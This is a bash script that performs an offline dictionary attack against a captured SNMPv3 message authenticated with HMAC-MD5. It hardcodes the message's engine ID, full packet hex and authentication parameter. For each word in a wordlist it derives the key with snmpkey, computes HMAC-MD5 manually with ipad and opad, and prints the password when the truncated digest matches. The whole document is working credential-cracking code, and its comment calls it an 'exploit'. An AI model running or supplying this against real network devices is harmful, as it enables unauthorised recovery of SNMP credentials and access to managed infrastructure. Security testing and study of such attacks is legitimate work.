#!/bin/bash

# Variables
msgAuthoritativeEngineID="80001f8880e9bd0c1d12667a5100000000"
msgAuthenticationParameters="b92621f4a93d1bf9738cd5bd" 
msgWhole="3081800201033011020420dd06a7020300ffe30401050201030431302f041180001f8880e9bd0c1d12667a5100000000020105020120040475736572040c00000000000000000000000004003035041180001f8880e9bd0c1d12667a51000000000400a11e02046b4c5ac20201000201003010300e060a2b06010201041e0105010500"

# Constants
dictionary="dico.txt"
ipad="36363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636"
opad="5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c"

# Function
function CompareHashes() {
	echo "Testing password: $password"

	# USMHMACMD5 exploit
	AuthKey=$(snmpkey md5 $password $msgAuthoritativeEngineID | grep authKey | cut -d ' ' -f 2 | cut -c 3-)
	ExtAuthKey="${AuthKey}000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
	K1=`echo "obase=16;ibase=16; xor(${ExtAuthKey^^},${ipad^^})" | BC_LINE_LENGTH=0 bc -l logic.bc`
	K2=`echo "obase=16;ibase=16; xor(${ExtAuthKey^^},${opad^^})" | BC_LINE_LENGTH=0 bc -l logic.bc`
	Hash_K1_msgWhole=$(echo -e -n $(echo -n ${K1,,}${msgWhole} | sed 's/../\\x&/g') | md5sum | awk '{print $1}')
	Hash_K2_HashK1msgWhole=$(echo -e -n $(echo -n ${K2,,}${Hash_K1_msgWhole} | sed 's/../\\x&/g') | md5sum | awk '{print $1}')
	TestmsgAuthenticationParameters=${Hash_K2_HashK1msgWhole:0:24}

	# Uncomment below for debugging
	#echo -e "DEBUG\n"
	#echo "AuthKey=${AuthKey}"
	#echo "ExtAuthKey=${ExtAuthKey}"
	#echo "K1=${K1}"
	#echo "K2=${K2}"
	#echo "Hash_K1_msgWhole=${Hash_K1_msgWhole}"
	#echo "Hash_K2_HashK1msgWhole=${Hash_K2_HashK1msgWhole}"
	#echo "TestmsgAuthenticationParameters=${TestmsgAuthenticationParameters}"

	if [ ${TestmsgAuthenticationParameters} == ${msgAuthenticationParameters} ]
	then
		# Hash matches, convey happy thoughts and exit
		echo "Winner Winner, Chicken Dinner! "
		echo "The password is: $password"
		exit 0
	fi
}

# Loop through the dictionary
while read password
do
	CompareHashes
done < ./${dictionary}
